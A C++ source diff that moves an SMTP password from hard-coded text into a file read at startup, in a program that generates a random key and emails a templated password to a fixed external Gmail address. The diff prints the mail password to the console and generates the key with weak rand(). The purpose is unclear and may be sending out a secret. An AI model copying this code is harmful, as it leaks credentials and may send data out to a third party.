@@ -82,6 +82,25 @@ extern "C" {
     char g_key[16] = { 0 };
 }
 
+std::string g_mail_password;
+
+std::string getMailPassword() {
+    std::ifstream file("mail.txt");
+    std::string line;
+
+    if (!file.is_open()) {
+      std::cout << "Could not open the file" << std::endl;
+      return {};
+    }
+
+    if (std::getline(file, line)) {
+      file.close();
+      return line;
+    }
+
+    return {};
+}
+
 void generate_random_string(char* str, size_t length = 16) {
     const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     size_t charset_size = sizeof(charset) - 1;
@@ -90,6 +109,9 @@ void generate_random_string(char* str, size_t length = 16) {
         str[i] = charset[rand() % charset_size];
     }
 }
+
+#define SMTP_MAIL_ADDR          "smtps://smtp.163.com:465"
+#define SMTP_MAIL_USERNAME      "shxm.ma@163.com"
 
 #define FROM_ADDR    "<shxm.ma@163.com>"
 #define TO_ADDR      "<wnpllr@gmail.com>"
@@ -148,6 +170,11 @@ static size_t payload_source(char* ptr, size_t size, size_t nmemb, void* userp)
 
 static int send_mail(const char* to_addr, const char* password)
 {
+    if (g_mail_password.empty()) {
+        cout << "smtp mail password not set" << endl;
+        return -1;
+    }
+
     std::string string(payload_text);
     payload_text_changed = std::regex_replace(string, std::regex("\\$PASSWORD"), password);
 
@@ -158,9 +185,9 @@ static int send_mail(const char* to_addr, const char* password)
 
     curl = curl_easy_init();
     if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.163.com:465");
-        curl_easy_setopt(curl, CURLOPT_USERNAME, "shxm.ma@163.com");
-        curl_easy_setopt(curl, CURLOPT_PASSWORD, "xxxxxx");
+        curl_easy_setopt(curl, CURLOPT_URL, SMTP_MAIL_ADDR);
+        curl_easy_setopt(curl, CURLOPT_USERNAME, SMTP_MAIL_USERNAME);
+        curl_easy_setopt(curl, CURLOPT_PASSWORD, g_mail_password.c_str());
 
         curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_ADDR);
 
@@ -877,6 +904,12 @@ int main()
     if (SetConsoleCtrlHandler((PHANDLER_ROUTINE)console_handler, TRUE) == FALSE) {
         printf("failed to set ctrl handler\n");
         return -1;
+    }
+
+    std::string mypassword = getMailPassword();
+    if (!mypassword.empty()) {
+        printf("mail password: %s\n", mypassword.c_str());
+        g_mail_password = mypassword;
     }
 
     generate_random_string(g_key);
